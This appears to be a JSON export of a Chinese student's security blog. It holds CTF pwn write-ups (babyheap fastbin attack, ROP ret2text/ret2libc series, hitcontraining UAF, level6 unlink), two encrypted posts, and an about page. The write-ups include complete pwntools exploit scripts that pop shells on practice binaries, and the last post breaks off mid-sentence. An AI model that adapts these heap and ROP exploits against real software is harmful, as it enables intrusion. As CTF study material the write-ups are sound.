{"pages":[{"title":"","text":"MEWHOAMI Y1seco Cyberspace Security, Beijing University of Posts and Telecommunications Mail: y1secoa@gmail.com 曾经的博客：https://blog.csdn.net/qq_45834505 ​ 我以后再也没看到蓝色玫瑰，但知道它在那里就够了。有时夜深人静，我就将水晶花瓶移到窗前，然后背对着它站着，这时我往往能闻到飘渺的花香，就知道它肯定已经在那里了，心灵的眼睛能看清它的每一个细节。我用心来抚摸着它的每一个花瓣，看它在来自窗外的夜风中微微摇曳……它是一朵我只能用心来看的花。不过，我还是有希望在此生再用自己的眼睛看到一次蓝色玫瑰，据丁仪说，从量子力学的角度来讲，人的死亡过程就是由一个强观察者变为弱观察者再变为非观察者的过程，当我变成弱观察者时，玫瑰的概率云向毁灭态的坍缩速度就会慢一些，我就有希望看到它。当我走到人生的尽头，当我在弥留之际最后一次睁开眼睛，那时我所有的知性和记忆都消失在过去的深渊中，又回到童年纯真的感觉和梦幻之中，那就是量子玫瑰向我微笑的时候。 ——《三体》","link":"/about/index.html"}],"posts":[{"title":"0ctf2017-babyheap","text":"fastbin attack 0x01 程序分析例行检查，64位程序，保护全开 ida查看main函数，菜单题 sub_D48：对应Allocate申请内存地址用来存放结构体，申请内存用的是calloc sub_E7F：对应编辑edit，这里没有检查size ，存在堆溢出 sub_F50:对应delete，free后指针清零不存在UAF sub_1051就是puts打印 0x02 思路利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写 0x03 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *# p = process(&quot;./0ctf_2017_babyheap&quot;)p=remote(&quot;node4.buuoj.cn&quot;,26060)context.log_level = 'debug'def allo(size): p.recvuntil(&quot;Command: &quot;) p.sendline(str(1)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def fill(idx,size,content): p.recvuntil(&quot;Command: &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size)) p.recvuntil(&quot;Content: &quot;) p.sendline(content)def free(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def dump(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(4)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))allo(0x10)#0allo(0x10)#1allo(0x10)#2allo(0x10)#3allo(0x80)#4free(1)free(2)payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)payload += p8(0x80)fill(0,len(payload),payload)payload = p64(0)*3 + p64(0x21)fill(3,len(payload),payload)allo(0x10)#1 The original position of 2allo(0x10)#2 4 Simultaneous pointingpayload = p64(0)*3 + p64(0x91)fill(3,len(payload),payload)allo(0x80)free(4)dump(2)content = u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')print(hex(content))libc_base = (content) - 0x3c4b78print(hex(libc_base))allo(0x60)free(4)payload = p64(libc_base + 0x3C4AED)fill(2,len(payload),payload)allo(0x60)allo(0x60)# gdb.attach(p)# pause()payload = 'a'*(0x8+0x2+0x8+1)payload += p64(libc_base+0x4526a)fill(6,len(payload),payload)allo(79)# gdb.attach(p)p.interactive() 0x04 参考文章https://blog.csdn.net/qq_43935969/article/details/115877748 https://www.cnblogs.com/Rookle/p/12901747.html","link":"/2022/01/14/0ctf_2017_babyheap/"},{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"基本ROP ret2text首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了NX保护，即不可在栈上执行代码。 使用IDA查看源码，可以看到这里有一个危险的gets函数 以及这里有一个system函数 所以如果能直接返回到0x804863A，即可执行该函数。 在GDB中对main函数里的gets函数下断点。 可以看到，存储局部变量 s(eax) 位于esp中存储 查看esp和ebp得知 s的地址为0xffffcecc ebp地址为0xffffcf38 两者距离108个字节 所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。) python脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 ret2shellcode先检查程序的保护机制 全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。 通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。 buf是一块位于bss段的可读可写可执行段。所以泄露思路为: 将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。 在gets函数处下断点 得知s地址为0xffffcecc，ebp地址为0xffffcf38 ebp+4即为函数返回地址。 所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。 写python脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() ret2syscall先检查开启了哪些防护措施 开启了NX保护，所以无法在栈上直接执行代码。 使用IDA查看，仍然是gets函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh 接下来要了解payload这样构成的原因，需要知道这三个指令 在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。 所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。 写出python脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc1给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了NX 检查是否存在/bin/sh 在IDA中查找system函数 查看到ptl处的system函数 写Python脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() ret2libc2这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数 直接给出python的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload ret2libc3 检查安全保护，只开启了NX IDA里查看，仍然是gets函数的堆栈溢出。 但是这里没有给system函数 也没有给定的/bin/sh 所以需要我们从libc中调用system函数 根据这个知识点 写exp,涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"To kk","text":"a6d9ea9da8fc05ccc8d1164b3233fcb96eadc174fe335a7406937ef7072c444d697324cba0e37b9b8446977dff318bb0db8606b3edf6b8d0daa86a2631e54543dbf7440acc018a572a5805e41c0a5aec4e9024ae5c9494b297378fd0133293fec6f8fc387b255223def0e791912688c260471b0946570bb6f261b14a00b094e5ea0523ef7c4b049ef6652ec40e5e53704f686bd661b3be8c7a2c43f4af3529538c4153b572e711ee1f2ce0217686708711bb3fea2deada3982089c6833593893cd51b4b88742924ef01aaacdb0fb5d2c75cace0713e615cae48331d4a1a47ec0081c6de2b4e1921fee686690e17a46abb6d5adde65fa21d0d2c36f066c29d0742cc1c2e03065d46fffd0339bcfe98bee42e123309c8c5a1bafdd1d2afbaf27f24cf7b265f0a48ba21a73986fd547205fee678555f0418a3e8b13612aeb9a558ff060a6846f74572e9fece580ea4787038abd6199eb609ccb6ab52c46bc928346e2e4387b84038ad88a7e7eb3c7e0abcf9590627c22df64a62f8fcc085c34f7c80cacbce53331ad33c8fbc08a8bf4fd75c0e02029e1b41ea799d9bc973590cd04b3d0879c6cb8d5c0e7a82b206fdd2bc2f69d91026065a5e9ecdc3d6a055996bc7a57899fb7063da7ec21906825e13064fc2f07368ed6696bc8074a1f2d07dd6ae2a2380880cbc96edb37fde089388a5b424f99ec10facf526311998a0f6525b02e4e003f5b6ce9912a14a4eaf66c77717c02e382edf3137a6aaf5afdfcdc9e42d074996f1d61c3b65c574a6c96b2256387ccacd237c16cc38a0cc150cdba7df33ff81424671dceb4968712412f409c4b8709f5f47be0c5d19296b4b36e2dbb9da02579b81eb7847e76e288e2b42a9010185bb15b1e4cbc773592fc31db3f3edeb3db16588558b49f1c857f0d42a2b02f582fc1ab2a66f455d2d4bc2f382df082c2818a81933c62786b3a65420b2fa43424db868a7992ec09fb439a5fd1b7ab44c278b48d8f4386dba71e0e0bf6bafdb804f5e190d8a147b094aee9eb460429d18df175cfd3edec4dcc51d1cbc562e2b1ff879866363f25b8e1b992eb66df62c10fb6eb64b33cf63a0bca450b1153f919a2d19bf8a798bbcebf94fd67f7cc2b083d778a2233dcf1769c40d881e6441e921c1107b192738a1498dddedef7a315b457e8906235d23e3fd89d239aee20f8f061f2b174dbd02e31ff3e090ea9896b0e3ff2302b535e74b1119099f0c52d7a60c6da30a1f959001a9d1cbec5ef5b51b1b6c3b303070ba3351ec179507479b87040445dda00195994497b0b62272cac0b4caceb371a1c18164f6db1c7bcc249bb8816b35377671d15a641c8a5230d8a7a212d494b11ded39816b38f30e6264815c5a03970867597fb2950d0f0c4d97d95c72c0cdcda64ac8d3099d5d80f7a0ef7af52d32198db256ad6947b9788dba5274baea5b0f9eb96e4edcca63b1d8b0864fa075130f7f8b988b35b3059b7841f0441ba12e96a2ee233ac1dc8fe77c512601c46e6aa47051f7e3c350fcd46d49a5780048c289ca0a8166945ffd28f749caf2b0d6c222f42e0a61d9444a275c90a144b468c7df8453d3ddb43d7bde971ad9d8d44d7d61194f478a099fa79455a6d9dcd354f243b4c1ee3229b6a3e80c150356bdee7b8f576227c7b00307e16d72ab9c6c1ca1642d8edc839f0227c583d70829378a42de0f0f4938a552878899561d946c834dec641e2e380c64f01d5da898aebf31d0ecba0944b934659605926f66cc506f2060819f1e2c3a0079026e77301084d1c4572f6d6249dfd6eb83efc90bdc09fa5575032bdf434b87e7863bc12dc0358068fd5abedac684b2d4db9e8f28e3f5e858e698e04388499101f6eeab96ef62f95a2e48c60e0c5f07043059b3b0c595f91242a3bacb650bf5ea384dd19a6272d6e811e92146bd29723e20987be93aaefecdc2543afb673578dd969c120932f5768d14ebb8105cc2a977039ec5cdfcd573a182d7e25e8707a58566e2de175301e4de60e77039c82457cc3a57c973ae7098babb023d8638b0ec81a78aa925b82280824f5a48afec35b5a87ecd91c1645ef7eba5056bf64774cc255b5e55632f95314e6ee549c5b0f69f65f04492a47f110dbfcb7c7e03e8abb255367b9b0964bb333732292e0ad92880194e7a5271f6a1833611137453ae5e08c2366fccdf731a72c494a430e59eb02375877538381f9381dcb229d2f98c994278dc8c4dd210e1035db105f965de586ebb3646f064d3d47c354ef0f005fe85678f92dd1404a4c881ef8308eb0216da32c7239434ff6b6f230377b2a20a7d014a8b0a2dbd35c1292356e624ea93f213ab0a245bcc89c5123fba71f32f32ae4406005a720d62190a342debd5b065ee26c98875ad59a9edca578102dbbb4d0b94c241574f6d34d432e588c3275ef5069e093f8253c3e85d9b3ba7b1a1e98b6024e1570a407e0c0f59b90f89efeab6333295fc000eb8683ad7f2749f51f14467953e32199eac5438868ecad43c90ebf6950258d3fa87d8170ee763322484800966abbe3215e0c65e250d9083314b352804afc1e55c94cf602a64bd4e6026cd0deb595396eeba327f2dd999d54389c979c81c936fc026226b96e734191a755bf66e34c13dea5113d89630d45fadf7326162604d4ce8e6d8a5c2589dfa919318ac37ec298913ac95f1a7061c74a2233f98249d687a3ee6d0848131044c23ebcba30bf34b77d7a32378125d736c56a80d0c273c84faac71a4c4355617c3d991f50de3d54f0ae1cad27b6693d14f11b9906f74c7de738c6fe20d529a13471ccb3274f3d9168fa9c984630db20b631b0404b7b08ce9fd20206a38f313b499846ea436818e59afad01ec9 Pease input your password","link":"/2022/01/02/To%20kk/"},{"title":"Diaries","text":"b6564b1d950e205446a5f2eabbefe8866c8c0c9144c3793e12be10a85944a02b9e5597b8013830aeb659dc6944f615e50212eca39800024b8915041b82abcbb1f909949a21ee7f948380a304a6a59254655a595662ef8de7c696c909b711d997e9eb675e8bea7c522698a91b595b6de3b69dcbba419572cc25b2185a4a82cce8bd2f6db3f7409fc95b7c5a9b3ba1ac7116919da19415da61d6b781aa18086d93dfeed04c4f81b9a2e2ee533e9db825675e10d1531160f7b3158e2e79b3c56ea069083c7c572d4e9e90fbbbd6b6755f7a70e691765c6234e8b30663740995bd9a157bdfd0047e76514ac4f89c7f453194a05a814b282265c9302fc51857f995e4010fae468aedf59cf8d02a50a16638422d7b29eb2774e6b44d3786131dd08f80185b89115c8f44850a75ce5852bcedad8957a1b0793c7e6339de5ee40130b024c91b4ce5b68fde1b79cb8130e8d1546c390bb72ab668236d7007c08912f687c1994a241a60dfa7e5c0c5477559644feb390cef5eb0fb5383caf8b13993502d3d9ce2380d2e346822ff931a3375e72cd568571c387f9762a664ea90900627b038861a1383ed19a29901ad10ae05429ba1e3627bb7ce1d0c993888c4bfb3d12c4bc4d91d3d2da3497f01319094c52d7e17036e025eaf1732e5ba714264ad7454291112b70483a4ba9aaecbc3a47da7d0be3b1f9fd0d18ada0122056aa443c24bf1a5a73d4a23b65a12e607e794c52b775aefb9b6210860e724999715a479b1fb524287d60ef43c1db037f5540d5db1e5fcadeee3ce77964efc9a24cdaf6281eb0004f1db42d5012582719bc20bd20e3a3119cda0e445ff9aa3497882ec0b54d10fdbba87ceb18e9121cde5e0204d21f22b4182bded3784849045161f045a7d3e29d9725e255c8aef501bfca97e461340ae17e09b9a72e3a52701486034861ce509e0d60028276f3b9efbcb9d9cd7872a0f4a6dd320123df8e71bef1436b01bdb843df2f21bc550b2ed8f1109bba2f13c0ee1072f984bf26d3976b1b26fe64801b3355e70a87059b0ee8facd989bcacd7c5fb83e4c88de349dfb664a058440f79e4fab1391efcdcc6312652d7ef3564bcbfd5120eeadbe25d5d35b33167464b2b13a7e9710cfd2d5e5855e37757ab2f664baec6268095abc67e22959e427479dc2c211fb65fc272afa03f0322759dfe52473ae9e6f869d015d1c029ab6fb3173e7b8cac34208c99ef4d3f51031bd48824cfda64bb4ef3d609c4cff7b8188fb69d505483f333e294ff22d532b587daa82e1e459b856cec1c29c8e138f1513993b3905406a5a6294141b755d401b97800f9ed9f0d965c382c900f5781308caf782bb3fca3b656e35e9b8640a9f2e333d25fa705d80cc95eb08cf15f557a5ba057d9a792ba3fb5f0408c273a56363dce042808398ec243da0020f293b2fedcdbcbd31a3f10b5a07d49e049e2eaa043a4232ab1fb86b19784cba2cb9f6d43a3ffd4b9ac58ede0aba3739885cb991f18719daed98bf240e2fa7a8e4406202a933842ab015de8b56c08aea1fe2f3bb8bf8be7fed795b6523bf7f68bac9f0bc81c67683a837f82c5eb599d8c0d6ee09dbf452fd4463cf090537a9a27037c5f0885f5621731c9f10617edd82f73cac28bc86a488559f37ea6d309f552c725851ad3a8018f92512e01aa25730c55a5f3e4bd6dc304a1471a8dd5bada58114dc28dc8788a75881f924e60fde96f56a391e04da341e774dc44442cefd4095c87a9d1a7cec92b023a06d70092a1ee0c7e0fa5adcd4f99fb609d7269e70f38a38b77cec17d0f95f35f0ef480d66046cec5779e57ebcc6d8f84170e4f9e904526c77a20cb964298534f97c85e4ea3590fd5f1d9163a01f318b419acd85d99ec2621bbd7d677773dea589d07813afdd2b2c34a7ec3ff61afab3c7f801369b3bf6ec90a1a5e5b2d3e8da02eebd2608052cc33f66ad223189d46c188fdce88038c526e9bb9dcb69c49ceec8d52ce9de4024f3974e85b618f85fba93b7a1b9f1d6a70e8370a7bb58dad93332a95132bc75705c79b532999c80b394626b905369069da7c6b84cf223108c5ed064d4e4eadf932896211de63e59c415d2420b11bfaa9f52a6ca443f75cab784304085b7287578a3e6cac1665e536962e50bb8b60431c0b55a6ed21fc8bd28af8f93809da8f5a9a66afd96e6f4938b853608e7556cda175b016fe84807d9d784432f0892a1adf49cfcc77f5e791bf0e36ddb3d617089232f5b05ae3dfbd3ff588550946b2ea5e68ba6fbeac953909423df405b4ddcd500268c5d375b20f93bd52eda68fed439160a4da74ed6f62642e8c561b794b96e2564945968b1a7407575f17cd000baf39920122d4de6f7db44d1b43adc9bab8ce4fbf76ee062503e2a5ab3f163f37cb14ca663d00b165155036698ccf3ecf0f77982028aed4a325e11944b53616d8bebc454e15bfb268528164eef976ba761e03e86d8f287056c8df5e4c9e97466409bd629c6c39dd853a5ef04b85eae33d8814f639013a23d78b6244eb57da0fe36c35f6c2779ce5e466a8c1162a2ab2bcb564977d8d19c4bdce5e33d6a6b0ccf3fbe81335f32e9204ac5f97c767aed7865d0556148ad555dab0ea2051490def843fbb82b8d7515016b706e528849a104dc8b5d36bcf54fc1a9dbbbaa85542fd218aa7cbfeb87587d0a9070ccc4c37a87bf6d749ebf2ad4fd7b0323f01e950d7a580877c4c1d58caaf938793a8fbff61dda15ae1a74fd3029845f6a4d7bef781452b981334ecaa509fbe48b2d39a37d1bd57b6d4cf76b7d448fb3549304469317d6d8fe0a0f7c919ca523c8308bb6c4a7d90ef8a18a7ab840aee67ed820da26e59fc9f9dcc5b2a9b92c9bb211a87e2495fc881daeb9100f94c6ce4f255df2d91011aab3b000d74819ed1cd001e9fe1561751c2ccf66e7f98a3f1af11f701870c452d519bad326738f27926f0066a75265555da34051af8270b78343c4b2b2d663b7fcdcf607e9d456daf0ea703e6a81cd6db12a070dae69c18892be87968b0106796c93873cb89aa2e7159eae36f01a19993735f8c12a37fc9036ba3a1c0ab692f34cf1e01bc51fece58ac0fa2a1b1d7f5a8689060f9ee2cf52606c7a0425ba49b32c58e56ae993527e56dca6c3e2a613dd92127974bc3834b4db8ccbed1534105c4cc616dc0e51060183fb41c84acdb0840fb7282e6eca62eef6cdab52d5d5596f0f86bb68dc1c05e0c4f5fc0bcbb73062732eddd21dbc6f0761348410486edeb8e674d88aaeaf3e101067bd42b566f428b542faf424a6e94de15f811b1b0c6c210ae2c08f3ffa21ed084333a3042647c05a9b35018ab6a478eb81794c6573c7db6be3f366e96830567f2bd30f1e2a99019226f2d73b3f18bb069cbee268e2af65f3a1d3ecce08369a77a9057216c25d716748d433fdd2ade782613539684de433df7f04a62c473de759c17c617f3cdf3e71536d5d6c329ece3b7ade8d67cbf93296a31714d439eedf53e5b8ed8a8ededc27ebbd16186b9b28be539508f227525353b10ce4c958ae3d19619a8dee7564f07a84394a14c003734748637a9c5e0bb2c7201ab2fc436546321742494c5e863b74edc4d8dc0d7d5463324729353d9cc3cf9955ee0eddd4d5cac3f7a0149c9165e9c6ff344c1d4675b336adf4544b34a17bae2f418dae9a7eb061666612883b6008ea252184d3dece44f1835ee39dc2781ad52e55c88503e8be7fca7f9e15ec4fd5a3a2b73019e3f1923df5792a10becff6c27adc2e33d01d74c142f626de851d344cc596209ab07203a686863014063d1a6904db8b09de55ba6dc48098927c36216c034fc40821a94c892c47a19a669913a871d704540f6fc3ef46f1e3cb7f0fcd2ed3fb76b80178f9e1788b8dc6276bf315e6a19795700e38db9d0a618e43482c7965215e0ceabb498e844d3c35d5f6c288210c8754a4eed3008862325085249b6d1dfb440afc9a2c930eeb7e2cc5fce27ce6c9ced227ba36e5a7ebe8761a71f4837901167eb81bc96d1f4c033c5a40eaf364cf45c62e241a9bff1d0573202661c2481847f7b7de66630fbd166e8c15523c2316920b0825ab26d81f441045d694bb83686657aad45692fba414620e8824dcbdba9b826edb841c9d9a05b29e42f41bc08d0704e345d5f6ea78d67636c7264ae8524d2584a01cf8bb1f708dfdef36c9c936ad3ef91cda36df96e1450d6defb4bfc8715ab593b2be8933c9b82a00c0b7239729f3d6b3682a74b6f7c9313d164ac8dcbbcdb516536267d9941184e12f7759b741de98c75ddf7fa9d7109e2d89a837cb61e178db8e2fd67999ab6810fd2cd58afa72e112c160d837d9546f9d68118048bdadae867d34491c6103ada4056af2adb142bc5a49ee2c0cdaea7b0c209e60d57d12deef2b236332ea3da05ee7caacecacd9c21a1cf4b21c6a0f5f2274ebbecc8015b5309e1f2e70b9820f619f1f9f6f9bdc74af69f5e76f509ee5ad41a3cc220f849214b0f5e88b1a295f21d301e4ee37adbed0d0ff6f53e27ce46e0d14626b0e28db6ceeb6cb736f6d6cdf6f6573c25b494355ca032dedf466a3511eb572f32a19a0de8b29cb53cab815b8626d25ca62b5c2d04a14fd7acda8cca6609a9dfb94d7085bfd96f63c5590eed89082ce05ff13489facce36c7572d4297a63e4b0b1767856d8f7b82d659bdf174340aa8c33ed7c05dfb6ae3c65883024e935e99e23194838c856655571f9bf7a7124c2b947bf7aa01b7d4a56615ee7f63f6a522b8fa73eff6725d8ce7adc62ae741d8cfa41b71b091fc2e8078aeca6544d3eb623ae12600bceb0275cf86fe45247461bf404457deb370dd02038dafc0e504f084707b30893d324e392100afd51637eba9915374acff9af6b877d3e9e35c678ddf5a5f84198dacf5167ebd6fe318d5714323c52e3885514676d59dc01c36e795c0a6721e6dc0cfd016d5b415322715545cd14f92f544886fb72e4fb9d2167bc1ca4dda40039bdaaeb1fb8ccba3aacdfd4248886329009dd3666e9bfb5931289322c58dc8dbad35807a6c7e3debb1332fed6cf0973d95a8f495d991d12d425d8e669632f8c752e0890b7db4f7cc3ef9c5b8c2534dfa8302fb63fc6c9c16268891bd6e2a20104a989a50492c83e8c1479a5a87fd1c31e68b18e2fda6df537185e6dc82d590d9657b439e9d19cec9994fbbe92a37aed974f6c6caeec7c42af4b8031607ae37cfb3bf79bded3de27982f758c1cbdf62027bf44bdc476256fc2641d549051c91b9dd4ff3cefaf876432a58b1f35bbdb3fe69b4f73c2d40e81b7a12f0a8f26c8608a31467e69c5e4c4f18b529c155d8184ea8c6b9a0401b452f973bdc226a51644d614f63485cc9fa0449949bd1e487d8f89fff2b99e1ae3d1a847e5713713fe52745bf47d548dd24c332b7a37d0237aec1e068500f5416bbfb91137fa5f86d52b15417dbdfa25e6f2cfd66b66f5822adaf4315f37eea521bd97e6d0e4b5ea222770adcef9b98abadf6cb17248d98c44e6d32bc95dad0bd3b4f9d766cbd38a4e58cd1244b2368a0a7ce5ce4a13bf49ab86f6b5f4bf17ad00f3d66904dc46da44c7469aeaf28a5a3f33a29cde9d9ff4c578a83ad322d3e67ccff8a92cec2f5260333ab8e3d2fac8f197b0e39c7f51424eb08beb30606a3a29f497e4f68e03670858dfa7b2531a369eb1d43e49821f6a554a791de9bd85dcea6f227bdc4c881e195656269de8727b8b472ca90354ee2b21b3147c20552a626d55d68f74018810d2dd0e239e63f792960d7b764e8f96240b8efdb1077f11f5e8c44335583a97d61bbb78366c720875c4cfcd7ac477caec44ad60d626c4d844bb638da9fce3fc452cbf51849d9a259ebcd0a79569a1c2dc7a5347284b94a3fb4c0882be008f3a24ab126386641b7d31ae6e973228c76aa76b59bf0b91135a8d7ef3b1bd74e9bc913bc2693fe254e53026257022dfae04b231959c8e5631c34cd0276a159780faaaa45da90f04470926c4cbf9ea91f6ccd27f455b8896e12c000062463bb179d8d6babd69c41bc8a9f9d61a8fbc4e51a2f0b2a544bd515de993576f0fee779c21dc583339bf6479f212c7f7e13cfb1aecf11e7814b407a876ef4fc1b82d9a38191849125f82cad312e91f95bacff296fcbd2d2b94dadfdf9af8d9a58fd34b33065e1308c2e114fd2366e71ad3d9212f91a6365a21fe7678b7aa7a202deb792cb0c19717c50ecb41d034dc2fa3bfbf412ec875c65d7e508cf68b5fde0a9f6927c118daf82c6ed56e1da98a40333b9a9b8df340e3e6752d6b Please input your password","link":"/2021/12/26/diary/"},{"title":"堆漏洞uaf","text":"uaf 知识点UAF漏洞全称为use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是C++对象，利用UAF修改C++的虚函数表导致的任意代码执行。 例题[BUUCTF]PWN——hitcontraining_uaf checksec检查，开了NX保护，32位 (1) add note add会申请两次内存,第一次申请8个字节,前四个字节指向print_note_content这个函数, 后四个字节指向我们写入的字符串(count会加1) (2) delete note 只释放了堆块里的内容但没有将指针置0，存在uaf漏洞，并未指向NULL (3) print note 调用add申请的第一个8个字节中的前四个字节指向的函数,打印add创建的第二个chunk里的值 （4） shell fastbin是单向链表遵循先进后出原则，申请A,B两个堆块后，先释放A ，后释放B，会在fastbin里形成链,此时，再次申请一个大小为0x8的内存C，并写入shellcode地址，那么第一个8个字节C就指向B，第二个8个字节C指向A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改print_note_content函数为我们想要执行的函数。 在add中，我们只能对content部分进行操作，无法对print_note_content对应的部分即put段进行操作，所以我们要想办法，操作put段 1根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic 申请过程堆块变化：add: free后： 再次申请，写入shell 先进后出原则 wp: 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./hacknote')# r = remote('node4.buuoj.cn',27609)shell_add = 0x8048945def add(size,content): r.sendlineafter('choice :','1') r.sendlineafter('Note size :',str(size)) r.sendlineafter('Content :',content)def delete(idx): r.sendlineafter('choice :','2') r.sendlineafter('Index :',str(idx))def printf(idx): r.sendlineafter('choice :','3') r.sendlineafter('Index :',str(idx))add(48,'aaaa')add(48,'bbbb')#gdb.attach(r)delete(0)delete(1)add(8,p32(shell_add))printf(0)#第二种思路double free#add(8,'aaaa')#delete(0)#delete(0)#add(40,'aaaa')#add(8,p32(shell_addr))#printf(1)r.interactive() 参考文章https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187 IE漏洞学习笔记（二）：UAF释放后重用 One_gadget和UAF结合利用堆溢出漏洞研究","link":"/2021/11/17/hitcontraining_uaf/"},{"title":"jarvisoj_level6_x64","text":"double free，unlink覆写got表 0x01 程序分析主函数： 之后 sub_400A49：用户初始堆分配 sub_400998：要求输入一个操作选项 sub_400B14：遍历索引打印所有标号和记录内容 sub_400BC2: 要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则malloc一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块： sub_400D87：编辑，是一个realloc，可以泄露堆溢出 堆v2也就是size进行了要求，在最后的sub_40085D函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和system地址。 sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并free掉堆块，存在double free漏洞 unlink思路 利用unsorted bin的fd指针分别泄露出heap地址和libc地址，这样就得到了最初那个0x1820大小的chunk的地址 利用realloc功能来构造unlink条件，结合uaf漏洞，修改某个ptr为ptr - 0x18，这个ptr在0x1820堆块上 利用edit修改atoi@got为system地址 输入/bin/sh拿shell 0x02 漏洞利用添加四个Note，释放note[0]和note[2]，此时note[0]的bk指向note[2]的chunk，note[2]的bk指向main_arena+0x58（两个chunk都进入unsorted 